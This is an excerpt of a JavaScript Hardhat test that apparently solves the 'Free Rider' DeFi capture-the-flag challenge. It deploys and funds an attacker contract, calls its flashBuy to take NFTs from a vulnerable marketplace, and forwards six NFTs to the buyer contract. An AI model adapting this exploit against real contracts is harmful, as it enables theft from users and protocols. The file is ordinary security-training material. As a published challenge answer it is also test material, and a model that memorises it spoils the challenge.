...
describe('[Challenge] Free Rider', function () {
  ...
  it('Exploit', async function () {
    ...
    const FlashRider = await ethers.getContractFactory('FlashRider', attacker);
    this.flashRider = await FlashRider.connect(attacker).deploy(
      this.uniswapFactory.address,
    ...
    // let estimateOutputs = await this.uniswapRouter.getAmountsIn(ethers.utils.parseEther('15').toString(), [
    //   this.token.address,
    //   this.weth.address,
    // ]);
    // console.log(ethers.utils.formatEther(estimateOutputs[0]));
    // console.log(ethers.utils.formatEther(estimateOutputs[1]));

    await attacker.sendTransaction({ to: this.flashRider.address, value: ethers.utils.parseEther('0.3') });
    // console.log(
    //   'balance of flashRider',
    //   ethers.utils.formatEther(await ethers.provider.getBalance(this.flashRider.address))
    // );

    await this.flashRider
      .connect(attacker)
      .flashBuy(
        this.token.address,
        this.weth.address,
    ...
    for (let i = 0; i < 6; i++) {
      // await this.nft.connect(attacker).transferFrom(this.flashRider.address, attacker.address, i);
      await this.nft
        .connect(attacker)
        ['safeTransferFrom(address,address,uint256)'](this.flashRider.address, this.buyerContract.address, i);
    }

    // console.log((await this.nft.balanceOf(attacker.address)).toString());
    // console.log((await this.nft.balanceOf(this.buyerContract.address)).toString());
    console.log('attacker balance', ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
    console.log('market balance', ethers.utils.formatEther(await ethers.provider.getBalance(this.marketplace.address)));
  });
